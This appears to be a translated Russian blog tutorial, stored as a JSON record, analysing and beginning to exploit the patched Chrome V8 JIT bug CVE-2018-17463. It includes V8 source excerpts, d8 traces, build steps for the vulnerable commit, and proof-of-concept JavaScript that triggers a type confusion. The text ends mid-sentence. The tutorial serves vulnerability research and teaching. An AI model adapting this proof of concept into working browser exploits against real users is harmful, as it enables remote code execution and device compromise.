{
    "article_id": "716640",
    "article_name": "Эксплойтинг браузера Chrome, часть 3: анализ и эксплойт уязвимости CVE-2018-17463",
    "content": "Это третья и последняя часть серии статьей про эксплойтинг браузера Chrome. В \nпервой части\n мы изучили внутреннюю работу JavaScript и V8. В том числе изучили объекты map и shape, а также рассмотрели методики оптимизации памяти, например, маркировку указателей и сжатие указателей.\n\r\n\n\r\nВо \nвторой части\n мы более глубоко исследовали конвейер компилятора V8. Изучили предназначение Ignition, Sparkplug и TurboFan в конвейере и рассмотрели такие темы, как байт-код V8, компиляция и оптимизация кода.\n\r\n\n\r\n\n\r\n\n\r\nВ этой части сосредоточимся на анализе и эксплойтинге уязвимости JIT-компилятора в TurboFan \nCVE-2018-17463\n. Эта уязвимость возникла из-за ненадлежащего моделирования побочных эффектов операции \nJSCreateObject\n на этапе понижающей оптимизации. Прежде чем мы приступим к эксплойтингу этого бага, нужно изучить фундаментальные примитивы эксплойтинга браузеров, такие как \naddrOf\n и \nfakeObj\n, а также узнать, как можно использовать этот баг для эксплойтинга type confusion.\n\r\n\n\r\n\n\r\n\nПредупреждение\n: имейте в виду, этот пост подробно, глубоко и пошагово разбирает процесс эксплойтинга \n(а еще это перевод)\n, поэтому его очень сложно читать.\n\r\n\n\r\nВ этом посте освещаются следующие темы:\n\r\n\n\r\n\n\r\n\nPatch Gapping\n\r\n\nАнализ первопричин CVE-2018-17463\n\r\n\nНастройка среды\n\r\n\nГенерация Proof of Concept\n\r\n\nЭксплойтинг Type Confusion для JSCreateObject\n\r\n\nПримитивы эксплойтинга браузеров\n\r\n\nПримитив чтения addrOf\n\r\n\nПримитив записи fakeObj\n\r\n\n\r\n\nПолучение возможности чтения+записи в память\n\r\n\nПолучение возможности исполнения кода\n\r\n\nОсновы внутренней работы WebAssembly\n\r\n\nЗлонамеренное использование памяти WebAssembly\n\r\n\n\r\n\n\r\n\nРазбираемся с Patch Gapping\n\r\nВ сентябре 2018 года в рамках программы SecuriTeam Secure Disclosure Beyond Security службе безопасности Google сообщили об \nIssue 888923\n. Этот баг благодаря изучению исходного кода обнаружил \nСэмюель Гросс\n и использовал его во время соревнования \nHack2Win\n. Месяцем позже баг был устранён, а отчёт о нём опубликован SSD Advisory под заголовком \nChrome Type Confusion in JSCreateObject Operation to RCE\n; в отчёте приводились подробности о баге и выпущен подробный proof of concept для его эксплуатации.\n\r\n\n\r\nВ том же месяце Сэмюель выступил на BlackHat 2018 с докладом \nAttacking Client-Side JIT Compilers\n, в котором рассказал об уязвимостях в JIT-компиляторах, и, в частности, об уязвимостях, связанных с устранением избыточности (redundancy elimination), а также моделированием побочных эффектов в IR. Лишь в 2021 году Сэмюель выпустил во Phrack статью \nExploiting Logic Bugs in JavaScript JIT Engines\n, в которой более подробно рассказал об открытии и эксплойтинге CVE-2018-17463.\n\r\n\n\r\nСтоит заметить, что существенная часть информации об этом баге была опубликована в течение нескольких недель после его обнаружения. Это значит, что нападающие могли бы использовать эту информацию для реверс-инжиниринга и эксплойтинга бага. Но большинство, если не все браузеры на базе Chrome были автоматически пропатчены за несколько дней или даже недель после того, как был выполнен первый пуш первого коммита исправления, из-за чего баг оказался практически бесполезным.\n\r\n\n\r\nВместо того, чтобы изучать публично доступную информацию о потенциальных багах, многие атакующие и разработчики эксплойтов отслеживают коммиты в поисках определённых ключевых слов. Когда они находят многообещающий коммит, то пытаются разобраться в баге, лежащем в его основе. Эта практика называется «\npatch gapping\n».\n\r\n\n\r\nКак объсняется в посте хакера \nExodus\n \nPatch Gapping Google Chrome\n, patch gapping — это «практика эксплойтинга уязвимостей в опенсорсном ПО, которые уже были устранены (или находятся в процессе устранения) разработчиками, но еще не опубликованы в виде патча для конечных пользователей».\n\r\n\n\r\nПочему это важно в контексте нашего обсуждения эксплойтинга браузера Chrome? Поняв концепцию patch gapping, мы сможем лучше воспринимать мир с точки зрения «противника». Узнав так много о внутренностях V8, вы сумеете найти потенциальный баг в коде Chrome по первому коммиту.\n\r\n\n\r\nВоспользовавшись этим подходом, мы можем расширить окно возможностей по эксплойтингу бага, а также углубить наши знания кодовой базы Chrome. Кроме того, наблюдая за местами в коде, которые часто патчат, мы можем получить представление о том, где следует искать потенциальные уязвимости нулевого дня в Chrome.\n\r\n\n\r\nС учётом всего этого, давайте начнём анализ первопричин, изучив первоначальный коммит, который запушили для устранения исследуемого нами бага. Мы попытаемся выполнить реверс-инжиниринг исправления и разобраться, как вызвать баг при помощи полученных нами знаний. Если зайдём в тупик, то воспользуемся уже существующими публичными ресурсами. В конце концов, это наше путешествие с целью эксплойтинга браузеров, а путешествия иногда бывают непростыми!\n\r\n\n\r\n\nАнализ первопричин CVE-2018-17463\n\r\nИзучив \nIssue 888923\n, мы увидим, что первоначальный патч для этого бага был запушен с коммитом \n52a9e67a477bdb67ca893c25c145ef5191976220\n, имеющим примечание \"[turbofan] Fix ObjectCreate’s side effect annotation\" («Устранение проблемы аннотирования побочного эффекта ObjectCreate»). Зная это, воспользуемся командой \ngit show\n в папке V8, чтобы посмотреть, что же исправил этот коммит.\n\r\n\n\r\n\n\r\nИзучив коммит, мы видим, что он исправляет единственную строку кода в файле \nsrc/compiler/js-operator.cc\n. Исправление просто заменяет флаг \nOperator::kNoWrite\n флагом \nOperator::kNoProperties\n для операции JavaScript \nCreateObject\n.\n\r\n\n\r\nКак вы можете помнить из второй части статьи, мы вкратце обсуждали эти флаги и говорили, что они используются операциями промежуточного представления (intermediate representation, IR). В данном случае флаг \nkNoWrite\n обозначает, что операция \nCreateObject\n не будет иметь наблюдаемых побочных эффектов, или, иными словами, наблюдаемых изменений в исполнении контекста.\n\r\n\n\r\nЭто представляет проблему для компилятора. Как мы знаем, некоторые операции могут иметь побочные эффекты, вызывающие в контексте наблюдаемые изменения. Например, если Map передаваемого объекта была изменена или модифицирована, то это наблюдаемый побочный эффект, который нужно записать в цепочку операций. В противном случае какие-то проходы оптимизации, например, устранение избыточности, могут удалить то, что компилятор считает «избыточной» операцией \nCheckMap\n, хотя на самом деле эта проверка обязательна. По сути, это может привести к уязвимости type confusion.\n\r\n\n\r\nИтак, давайте проверим, действительно ли функция \nCreateObject\n имеет наблюдаемый побочный эффект.\n\r\n\n\r\nЧтобы определить, имеет ли операция IR побочные эффекты, нужно посмотреть на понижающий этап оптимизирующего компилятора. Этот этап преобразует высокоуровневые операции IR в команды более низкого уровня для JIT-компиляции; кроме того, здесь происходит устранение избыточности.\n\r\n\n\r\nДля операции JavaScript \nCreateObject\n понижение происходит в файле исходников \nv8/src/compiler/js-generic-lowering.cc\n, а конкретно в функции \nLowerJSCreateObject\n.\n\r\n\n\r\n\nvoid JSGenericLowering::LowerJSCreateObject(Node* node) {\n  CallDescriptor::Flags flags = FrameStateFlagForCall(node);\n  Callable callable = Builtins::CallableFor(\n      isolate(), Builtins::kCreateObjectWithoutProperties);\n  ReplaceWithStubCall(node, callable, flags);\n}\n\r\nИзучая понижающую функцию, мы видим, что операция IR \nJSCreateObject\n будет понижена до вызова встроенной функции \nCreateObjectWithoutProperties\n, находящейся внутри файла исходников \nv8/src/builtins/object.tq\n.\n\r\n\n\r\n\ntransitioning builtin CreateObjectWithoutProperties(implicit context: Context)(\n    prototype: JSAny): JSAny {\n  try {\n    let map: Map;\n    let properties: NameDictionary|SwissNameDictionary|EmptyFixedArray;\n    typeswitch (prototype) {\n      case (Null): {\n        map = *NativeContextSlot(\n            ContextSlot::SLOW_OBJECT_WITH_NULL_PROTOTYPE_MAP);\n        @if(V8_ENABLE_SWISS_NAME_DICTIONARY) {\n          properties =\n              AllocateSwissNameDictionary(kSwissNameDictionaryInitialCapacity);\n        }\n        @ifnot(V8_ENABLE_SWISS_NAME_DICTIONARY) {\n          properties = AllocateNameDictionary(kNameDictionaryInitialCapacity);\n        }\n      }\n      case (prototype: JSReceiver): {\n        properties = kEmptyFixedArray;\n        const objectFunction =\n            *NativeContextSlot(ContextSlot::OBJECT_FUNCTION_INDEX);\n        map = UnsafeCast<Map>(objectFunction.prototype_or_initial_map);\n        if (prototype != map.prototype) {\n          const prototypeInfo = prototype.map.PrototypeInfo() otherwise Runtime;\n          typeswitch (prototypeInfo.object_create_map) {\n            case (Undefined): {\n              goto Runtime;\n            }\n            case (weak_map: Weak<Map>): {\n              map = WeakToStrong(weak_map) otherwise Runtime;\n            }\n          }\n        }\n      }\n      case (JSAny): {\n        goto Runtime;\n      }\n    }\n    return AllocateJSObjectFromMap(map, properties);\n  } label Runtime deferred {\n    return runtime::ObjectCreate(prototype, Undefined);\n  }\n}\n\r\nВ этой функции много кода. Нам не нужно понимать его полностью; если вкратце, эта функция начинает процесс создания нового объекта без свойств. Любопытный аспект этой функции заключается в \ntypeswitch\n для \nпрототипа\n объекта.\n\r\n\n\r\nЭто интересно из-за трюка с оптимизацией в V8. В языке JavaScript каждый объект имеет приватное свойство, содержащее ссылку на другой объект, называемый \nпрототипом\n. Если объяснять просто, прототип схож с классом C++, где объекты могут наследовать признаки от определённых классов. Этот объект-прототип имеет собственный прототип, то же самое относится и к прототипу прототипа. Получается «\nцепочка прототипов\n», продолжающаяся, пока не будет достигнут объект со значением \nnull\n.\n\r\n\n\r\nВ этом посте я не буду вдаваться в подробности прототипов, но для лучшего понимания этой концепции вы можете прочитать \nObject Prototypes\n и \nInheritance and the Prototype Chain\n. Пока давайте сосредоточимся на оптимизации прототипов в V8.\n\r\n\n\r\nВ V8 каждый прототип имеет уникальный shape, \nне являющийся общим ни с одним другим объектом\n, и, в частности, ни с каким другим прототипом. При изменении прототипа объекта для этого прототипа распределяется \nновый shape\n. Подробнее об этой оптимизации можно прочитать в \nJavaScript Engine Fundamentals: Optimizing Prototypes\n.\n\r\n\n\r\nИз-за этого нам стоит уделить внимание коду, потому что оптимизация прототипов — это побочный эффект, который в случае неверного моделирования может иметь последствия.\n\r\n\n\r\nВ конечном итоге, функция \nCreateObjectWithoutProperties\n вызывает функцию \nObjectCreate\n, которая является встроенной функцией среды исполнения C++, расположенной в \nv8/src/objects/js-objects.cc\n. В кодовой базе 2018 года эта функция находилась в файле \nv8/src/objects.cc\n.\n\r\n\n\r\n\n// 9.1.12 ObjectCreate ( proto [ , internalSlotsList ] )\n// Notice: This is NOT 19.1.2.2 Object.create ( O, Properties )\nMaybeHandle<JSObject> JSObject::ObjectCreate(Isolate* isolate,\n                                             Handle<Object> prototype) {\n  // Generate the map with the specified {prototype} based on the Object\n  // function's initial map from the current native context.\n  // TODO(bmeurer): Use a dedicated cache for Object.create; think about\n  // slack tracking for Object.create.\n  Handle<Map> map =\n      Map::GetObjectCreateMap(isolate, Handle<HeapObject>::cast(prototype));\n\n  // Actually allocate the object.\n  return isolate->factory()->NewFastOrSlowJSObjectFromMap(map);\n}\n\r\nЗаглянув в функцию \nObjectCreate\n, мы видим, что она генерирует \nновую map\n для объекта на основании нашего предыдущего прототипа объекта при помощи функции \nGetObjectCreateMap\n, которая находится в \nv8/src/objects/map.cc\n.\n\r\n\n\r\nНа этом этапе мы уже должны начать видеть, в чём заключаются потенциальные побочные эффекты в этом операторе JavaScript.\n\r\n\n\r\n\n// static\nHandle<Map> Map::GetObjectCreateMap(Isolate* isolate,\n                                    Handle<HeapObject> prototype) {\n  Handle<Map> map(isolate->native_context()->object_function().initial_map(),\n                  isolate);\n  if (map->prototype() == *prototype) return map;\n  if (prototype->IsNull(isolate)) {\n    return isolate->slow_object_with_null_prototype_map();\n  }\n  if (prototype->IsJSObject()) {\n    Handle<JSObject> js_prototype = Handle<JSObject>::cast(prototype);\n    if (!js_prototype->map().is_prototype_map()) {\n      JSObject::OptimizeAsPrototype(js_prototype); // <== Side Effect\n    }\n    Handle<PrototypeInfo> info =\n        Map::GetOrCreatePrototypeInfo(js_prototype, isolate);\n    // TODO(verwaest): Use inobject slack tracking for this map.\n    if (info->HasObjectCreateMap()) {\n      map = handle(info->ObjectCreateMap(), isolate);\n    } else {\n      map = Map::CopyInitialMap(isolate, map);\n      Map::SetPrototype(isolate, map, prototype);\n      PrototypeInfo::SetObjectCreateMap(info, map);\n    }\n    return map;\n  }\n\n  return Map::TransitionToPrototype(isolate, map, prototype); // <== Side Effect\n}\n\r\nВ функции \nGetObjectCreateMap\n мы также видим два интересных вызова \nJSObject::OptimizeAsPrototype\n и \nMap::TransitionToPrototype\n. Это интересно, потому что этот код подразумевает и ещё раз подтверждает, что новый созданный объект преобразуется в объект-прототип, что также изменяет связанную с объектом map.\n\r\n\n\r\nЗная это, перейдём в \nd8\n и убедимся, что функция \nObject.create\n и в самом деле модифицирует объект и map неким образом, который позволит нам выполнить эксплойт. Для начала запустим \nd8\n с опциями \n--allow-natives-syntax\n и создадим новый объект.\n\r\n\n\r\n\nd8> %DebugPrint(obj)\nDebugPrint: 000002A50010A505: [JS_OBJECT_TYPE]\n - map: 0x02a5002596f5 <Map[16](HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x02a500244669 <Object map = 000002A500243D25>\n - elements: 0x02a500002259 <FixedArray[0]> [HOLEY_ELEMENTS]\n - properties: 0x02a500002259 <FixedArray[0]>\n - All own properties (excluding elements): {\n    000002A5000041ED: [String] in ReadOnlySpace: #x: 13 (const data field 0), location: in-object\n }\n000002A5002596F5: [Map] in OldSpace\n - type: JS_OBJECT_TYPE\n - instance size: 16\n - inobject properties: 1\n - elements kind: HOLEY_ELEMENTS\n - unused property fields: 0\n - enum length: invalid\n - stable_map\n - back pointer: 0x02a5002596cd <Map[16](HOLEY_ELEMENTS)>\n - prototype_validity cell: 0x02a5002043cd <Cell value= 1>\n - instance descriptors (own) #1: 0x02a50010a515 <DescriptorArray[1]>\n - prototype: 0x02a500244669 <Object map = 000002A500243D25>\n - constructor: 0x02a50024422d <JSFunction Object (sfi = 000002A50021BA25)>\n - dependent code: 0x02a5000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>\n - construction counter: 0\n\r\nПросмотрев эти результаты, мы видим, что map объекта является map \nFastProperties\n, что соответствует нашему объекту, имеющему внутриобъектные свойства. Теперь давайте выполним функцию \nObject.create\n для нашего объекта и выведем её отладочную информацию.\n\r\n\n\r\n\nd8> Object.create(obj)\nd8> %DebugPrint(obj)\nDebugPrint: 000002A50010A505: [JS_OBJECT_TYPE]\n - map: 0x02a50025a9c9 <Map[16](HOLEY_ELEMENTS)> [DictionaryProperties]\n - prototype: 0x02a500244669 <Object map = 000002A500243D25>\n - elements: 0x02a500002259 <FixedArray[0]> [HOLEY_ELEMENTS]\n - properties: 0x02a50010c339 <NameDictionary[17]>\n - All own properties (excluding elements): {\n   x: 13 (data, dict_index: 1, attrs: [WEC])\n }\n000002A50025A9C9: [Map] in OldSpace\n - type: JS_OBJECT_TYPE\n - instance size: 16\n - inobject properties: 1\n - elements kind: HOLEY_ELEMENTS\n - unused property fields: 0\n - enum length: invalid\n - dictionary_map\n - may_have_interesting_symbols\n - prototype_map\n - prototype info: 0x02a50025a9f1 <PrototypeInfo>\n - prototype_validity cell: 0x02a5002043cd <Cell value= 1>\n - instance descriptors (own) #0: 0x02a5000021ed <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>\n - prototype: 0x02a500244669 <Object map = 000002A500243D25>\n - constructor: 0x02a50024422d <JSFunction Object (sfi = 000002A50021BA25)>\n - dependent code: 0x02a5000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>\n - construction counter: 0\n\r\nКак видите, при вызове \nObject.create\n map объекта меняется с map \nFastProperties\n с внутриобъектными свойствами на map \nDictionaryProperties\n, где эти свойства теперь хранятся в словаре. Этот побочный эффект инвалидирует флаг \nkNoWrite\n для операции \nObjectCreate\n промежуточного представления (IR), доказывая, что это допущение ошибочно.\n\r\n\n\r\nВ данном случае, если мы можем сделать так, чтобы операция \nCheckMap\n была устранена при помощи устранения избыточности до вызова \nObject.create\n, то сможем создать уязвимость type confusion. Type confusion возникает, когда движок пытается получить доступ к внешним свойствам в хранилище свойств. Движок ожидает, что хранилище свойств будет являться \nFixedArray\n, в котором каждое свойство хранится одно за другим, однако теперь оно указывает на более сложный \nNameDictionary\n.\n\r\n\n\r\n\nНастройка среды\n\r\nПрежде чем приступать к анализу и эксплойтингу бага, нам нужно подготовить среду разработки. Если вы следили за этой серией постов с первой части, то, вероятно, уже настроили работающую версию d8 в соответствии с моим руководством \nBuilding Chrome V8 on Windows\n.\n\r\n\n\r\nПоскольку баг был открыт в 2018 году, в кодовой базе Chromium произошло множество изменений наряду с изменениями в зависимостях, необходимых для сборки более новых версий. Для воссоздания этого бага достаточно применить показанный ниже патч diff к файлу \nsrc/compiler/js-operator.cc\n:\n\r\n\n\r\n\n\r\nОднако при тестировании, несмотря на то, что мне удалось исполнить баг, я не смог получить работающую type confusion и использовать примитивы \naddrOf\n и \nfakeObj\n (о которых мы поговорим ниже). Я не знаю точно, почему так получилось, но может быть, что между 2018 и 2022 годами было изменение в коде, пропатчившее ту часть кодовой базы, которая необходима для этих примитивов.\n\r\n\n\r\n\nДополнение\n: эта type confusion не работала на новых версиях V8 после патча diff потому, что была включена \nV8 Heap Sandbox\n. По сути, эта песочница не позволяет нападающему повреждать объекты V8 наподобие \nArrayBuffer\n.\n\r\nВместо этого я решил проверить последний «уязвимый» коммит до устранения бага и снова собрал v8 и d8. Это само по себе вызвало проблемы, поскольку браузеру Chrome 2018 года требовалась Visual Studio 2017, а в нашей текущей среде используется Visual Studio 2019. Хотя собрать Chrome при помощи Visual Studio 2019 возможно, сначала нужно установить обязательные компоненты.\n\r\n\n\r\nПервым делом откроем Visual Studio 2019 Installer и установим следующие дополнительные компоненты:\n\r\n\n\r\n\n\r\n\nMSVC v140 — VS 2015 C++ build tools (v14.00)\n\r\n\nMSVC v141 — VS 2017 C++ x64/x86 build tools (v14.16)\n\r\n\nWindows 10 SDK (10.0.17134.0)\n\r\n\n\r\nПосле установки компонентов нам нужно добавить следующие переменные среды (Environmental Variable):\n\r\n\n\r\n\n\r\n\nДобавить пользовательскую переменную \nvs2017_install\n и присвоить ей значение \nC:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\\n\r\n\nДобавить \nC:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.17134.0\\x64\n в пользовательскую переменную \nPath\n.\n\r\n\n\r\nНастроив всё это, мы должны модифицировать кодовую базу V8. Если взглянуть в \ngit log\n коммита \n52a9e67a477bdb67ca893c25c145ef5191976220\n, то можно увидеть, что последним уязвимым коммитом до устранения бага был \n568979f4d891bafec875fab20f608ff9392f4f29\n.\n\r\n\n\r\n\n\r\nИмея на руках этот коммит, мы можем выполнить команду \ngit checkout\n, чтобы обновить файлы в папке V8 так, чтобы они соответствовали версии последнего уязвимого коммита.\n\r\n\n\r\n\nC:\\dev\\v8\\v8>git checkout 568979f4d891bafec875fab20f608ff9392f4f29\nHEAD is now at 568979f4d8 [parser] Fix memory accounting of explicitly cleared zones\n\r\nПосле настройки удалим папку \nx64.debug\n из папки \nv8\\v8\\out\\\n, чтобы избежать ошибок. Далее изменим скрипт сборки \nbuild/toolchain/win/tool_wrapper.py\n так, чтобы он соответствовал содержимому файла \ntool_wrapper.py\n после исправлений для \nустранения хака superflush\n возникшего из-за ошибки сборки, отчёт о которой представлен в \nIssue 1033106\n.\n\r\n\n\r\nПосле изменения файла \ntool_wrapper.py\n вы сможете \nсобрать отладочную\n версию d8 при помощи следующих команд:\n\r\n\n\r\n\nC:\\dev\\v8\\v8>gn gen --ide=vs out\\x64.debug\nC:\\dev\\v8\\v8>cd out\\x64.debug\nC:\\dev\\v8\\v8\\out\\x64.debug>msbuild all.sln\n\r\nДля завершения этой сборки может потребоваться длительное время, поэтому пока заварите себе кофе.\n\r\n\n\r\nПосле завершения сборки у вас должно получиться запустить d8 и успешно выполнить скрипт \npoc.js\n из \nSSD Advisory\n, он позволяет убедиться, что вы можете создать работающий примитив чтения/записи.\n\r\n\n\r\n\nГенерация Proof of Concept\n\r\nТеперь, когда у нас есть уязвимая версия V8 и понимание бага, мы можем начать писать proof of concept. Давайте начнём с повторения того, что должен уметь этот proof of concept:\n\r\n\n\r\n\n\r\n\nСоздавать новый объект со внутренним свойством, который будет использоваться как наш прототип для \nObject.create\n.\n\r\n\nДобавлять новое внешнее свойство по отношению к хранилищу свойств объекта, к которому мы попытаемся получить доступ после преобразования Map.\n\r\n\nПринудительно выполнять операцию \nCheckMap\n для объекта, чтобы сработало устранение избыточности, что удалит последующие операции \nCheckMap\n.\n\r\n\nВызывать \nObject.create\n с ранее созданным объектом для принудительного выполнения преобразования Map.\n\r\n\nПолучать доступ к внешнему свойству нашего объекта.\n\r\n\nИз-за устранения избыточности \nCheckMap\n движок разыменует указатель на свойство, думая, что это массив. Однако теперь он указывает на \nNamedDictionary\n, что позволяет нам получать доступ к другим данным.\n\r\n\n\r\n\n\r\nПоначалу это может показаться простым. Однако важно понимать, что на практике баги часто сложнее, чем в теории, особенно когда дело касается их запуска или эксплойтинга. Поэтому обычно самое сложное — это запустить баг и заставить работать type confusion. После этого процесс создания эксплойта обычно становится проще.\n\r\n\n\r\nИтак, как же нам начать?\n\r\n\n\r\nК счастью для нас, при изучении diff для \n52a9e67a477bdb67ca893c25c145ef5191976220\n выяснилось, что команда разработчиков Chrome добавила в коммит регрессионный тест. Тест используется для проверки отсутсвия влияния обновлений и модификаций приложения на общую функциональность. В данном случае оказалось, что файл регрессии тестирует на наличие нашего бага!\n\r\n\n\r\nДавайте изучим тестовый случай и узнаем, с чем мы можем работать.\n\r\n\n\r\n\n// Flags: --allow-natives-syntax\n\n(function() {\n  function f(o) {\n    o.x;\n    Object.create(o);\n    return o.y.a;\n  }\n\n  f({ x : 0, y : { a : 1 } });\n  f({ x : 0, y : { a : 2 } });\n  %OptimizeFunctionOnNextCall(f);\n  assertEquals(3, f({ x : 0, y : { a : 3 } }));\n})();\n\r\nВ начале кода мы видим, что создаётся новая функция \nf\n, получающая объект \no\n. При вызове функции она выполняет с переданным объектом следующие действия:\n\r\n\n\r\n\n\r\n\nПолучает доступ к свойству \na\n объекта \no\n, что должно привести к принудительному выполнению операции \nCheckMap\n.\n\r\n\nВызывает \nObject.create\n для объекта \no\n, что должно привести к принудительному преобразованию Map.\n\r\n\nВыполняет доступ к внешнему свойству \na\n в переданном объекте \ny\n, что должно вызвать type confusion.\n\r\n\n\r\nМы видим, что эта функция вызывается дважды с простыми объектами и свойствами, а затем вызывается \n%OptimizeFunctionOnNextCall\n, что заставляет V8 передать функцию компилятору TurboFan для оптимизации. Это избавляет нас от необходимости выполнять цикл, чтобы сделать функцию «горячей». Затем функция вызывается в третий раз, что должно привести к запуску нашего бага.\n\r\n\n\r\nКак видите, вызывается метод \nassert\n для проверки того, что возвращается значение \n3\n. Если это не так, то есть вероятность, что баг всё ещё присутствует.\n\r\n\n\r\nДля нас это полезно, потому что теперь у нас есть работающий proof of concept, который можно использовать. Не знаю, зачем они использовали объект в хранилище свойств вместо значения. Возможно, мы разберёмся позже.\n\r\n\n\r\nТеперь создадим собственный скрипт proof of concept, воспользовавшись собранной информацией. Позже выполним несколько проверок, чтобы убедиться, что у нас и в самом деле получилась работающая type confusion, а также воспользуемся Turbolizer, чтобы проверить, что операция \nCheckMap\n и в самом деле была удалена при помощи устранения избыточности.\n\r\n\n\r\nНаш proof of concept должен выглядеть так:\n\r\n\n\r\n\nfunction vuln(obj) {\n    // Выполняем доступ к свойству a объекта obj, что заставляет выполнить операцию CheckMap\n    obj.a;\n\n    // Принудительное преобразование Map при помощи побочного эффекта\n    Object.create(obj)\n\n    // Запуск type confusion при помощи доступа к внешнем свойству\n    return obj.b;\n}\n\nvuln({a:42, b:43}); // Разогрев кода\nvuln({a:42, b:43});\n%OptimizeFunctionOnNextCall(vuln); // Уязвимость JIT-компиляции\nvuln({a:42, b:43}); // Запуск type confusion - не должно возвращать 43!\n\r\nСоздав наш proof of concept, запустим \nd8\n с флагом \n--allow-naitives-syntax\n и добавим в нашу функцию \nvuln\n. После создания функции исполним последние четыре строки кода в proof of concept. Результаты должны быть следующими:\n\r\n\n\r\n\nd8> vuln({a:42, b:43})\n43\nd8> vuln({a:42, b:43})\n43\nd8> %OptimizeFunctionOnNextCall(vuln)\nundefined\nd8> vuln({a:42, b:43})\n0\n\r\nТаким образом, мы получили работающий proof of concept! Как видите, оптимизированная функция больше не возвращает \n43\n, а возвращает \n0\n.\n\r\n\n\r\nПрежде чем мы углубимся в изучение бага и попытаемся получить работающую уязвимость type confusion, запустим этот скрипт с флагом \n--trace-turbo\n и изучим IR на каждом этапе оптимизации, чтобы убедиться, что узел \nCheckMap\n и в самом деле был удалён, а всё это не простая случайность.\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 --allow-natives-syntax --trace-turbo poc.js\nConcurrent recompilation has been disabled for tracing.\n---------------------------------------------------\nBegin compiling method vuln using Turbofan\n---------------------------------------------------\nFinished compiling method vuln using Turbofan\n\r\nПосле создания файла turbo давайте изучим этап оптимизации Typer, чтобы посмотреть на исходный граф IR.\n\r\n\n\r\n\n\r\nПервоначальный анализ IR показывает то, что мы ожидали. Как видите, узел \nParameter[1]\n передаёт объект для нашей функции. Этот объект проходит через операцию \nCheckMaps\n для валидации map, а затем вызывается операция \nLoadField\n для возврата свойства \na\n.\n\r\n\n\r\nДалее мы вызываем \nJSCreateObject\n для превращения нашего объекта в прототип. Затем IR выполняет операцию \nCheckMaps\n, чтобы валидировать Map объекта, после чего вызывает операцию \nLoadField\n для возврата свойства \nb\n. Это ожидаемый поток побочных эффектов, который должен был сохраниться.\n\r\n\n\r\nА теперь давайте взглянем на IR после этапа понижения. Так как \nCreateObject\n не выполняет запись в цепочку побочных эффектов, узел \nCheckMaps\n больше не будет существовать из-за устранения избыточности.\n\r\n\n\r\n\n\r\nКак мы видим на упрощённом этапе понижения, наш предыдущий узел \nCheckMaps\n после вызова \nJSCreateObject\n был удалён и напрямую вызывается узел \nLoadField\n.\n\r\n\n\r\nУбедившись в том, что подвергнутый JIT код и в самом деле удаляет узел \nCheckMaps\n, изменим proof of concept так, чтобы он не использовал \n%OptimizeFunctionOnNextCall\n и вместо этого поместим наш код в цикл, чтобы при его исполнении за дело бралась JIT.\n\r\n\n\r\nКроме того, на этот раз добавим нашему объекту внешнее свойство, чтобы мы могли вынудить JIT осуществить доступ к хранилищу как к массиву, что запустит нашу type confusion.\n\r\n\n\r\nОбновлённый POC будет выглядеть так:\n\r\n\n\r\n\nfunction vuln(obj) {\n  // Выполняем доступ к свойству a объекта obj, что заставляет выполнить операцию CheckMap\n  obj.a;\n\n  // Принудительное преобразование Map при помощи побочного эффекта\n  Object.create(obj)\n\n  // Запуск type confusion при помощи доступа к внешнем свойству\n  return obj.b;\n}\n\nfor (let i = 0; i < 10000; i++) {\n  let obj = {a:42}; // Создание объекта с внутренними свойствами\n  obj.b = 43; // Сохраняем внешнее свойство в хранилище\n  vuln(obj); // Запускаем type confusion\n}\n\r\nОбновив этот код и запустив его с флагом \n--trace-turbo\n, снова убедимся, что у нас есть работающая уязвимость type confusion. Как мы видели в IR, компилятор выполняет доступ к указателю хранилища нашего объекта по смещению 8, а затем загружает свойство \nb\n, которое, по его мнению, находится по смещению 16 в массиве. Однако на самом деле он выполнит доступ к другой области данных, потому что это больше не массив, а словарь.\n\r\n\n\r\n\n\r\n\nЭксплойтинг Type Confusion для JSCreateObject\n\r\nТеперь, когда у нас есть работающая уязвимость type confusion, при которой V8 выполняет доступ к \nNamedDictionary\n как к массиву, нужно разобраться, как можно использовать эту уязвимость для получения доступа на чтение и запись в кучу V8.\n\r\n\n\r\nВ отличие от многих эксплойтов, эта уязвимость не задействует изъян с повреждением памяти, поэтому невозможно выполнить переполнение буфера и управлять указателем команд (RIP). Однако уязвимости вида type confusion позволяют манипулировать указателями функций и данными в структуре данных объекта. Например, мы можем перезаписать указатель на объект, после чего V8 разыменует этот указатель или выполнит переход к нему, поэтому мы сможем получить возможность исполнения кода.\n\r\n\n\r\nК сожалению, мы не можем просто вслепую начинать считывать и записывать данные в объекты, не обладая определённой степенью точности. Как было видно выше в IR, у нас есть определённый контроль над тем, где V8 будет считывать и записывать данные; это делается при помощи указания свойства в массиве. Однако из-за type confusion этот массив преобразуется в \nNameDictionary\n, то есть структура меняется.\n\r\n\n\r\nЧтобы выполнить эксплойт этой уязвимости, нам нужно понимать, как отличаются структуры этих двух объектов, и как мы можем манипулировать ими для достижения своих целей.\n\r\n\n\r\nКак мы знаем из части первой, массив — это просто структура \nFixedArray\n, одно за другим хранящая значения свойств, доступ к которым выполняется по индексу. Как вы можете видеть в показанном выше IR, первый вызов \nLoadField\n выполняется по смещению 8, что будет указателем хранилища свойств в \nJSObject\n. Так как в хранилище есть только одно внешнее свойство, мы видим, что вторая \nLoadField\n выполняет доступ к первому свойству по смещению 16, изначально перепрыгивая через Map и Length.\n\r\n\n\r\n\n\r\nМы также знаем, что после преобразования из массива в словарь, вся информация о метаданных свойств хранится не в Descriptor Array внутри Map, а непосредственно в хранилище свойств. В данном случае, словарь хранит значения свойств внутри динамического буфера, состоящего из триплетов «имя, значение, подробности».\n\r\n\n\r\nПо сути, структура \nNameDictionary\n сложнее, чем мы описывали в первой части этой серии статей. Чтобы вы лучше поняли структуру памяти \nNameDictionary\n, я представил ниже наглядный пример.\n\r\n\n\r\n\n\r\nКак видите, \nNameDictionary\n хранит триплеты свойств, а также дополнительные метаданные, связанные с количеством элементов в словаре. В данном случае, наша уязвимость type confusion считывает данные по смещению 16, как в описанном выше IR, а затем ей нужно считать количество элементов, хранящихся в словаре.\n\r\n\n\r\nДля проверки этой информации мы можем повторно использовать наш скрипт proof of concept и задать точки останова в WinDbg, чтобы изучить структуры памяти наших объектов. Простой способ отладки этих скриптов proof of concept заключается в установке точки останова на функции 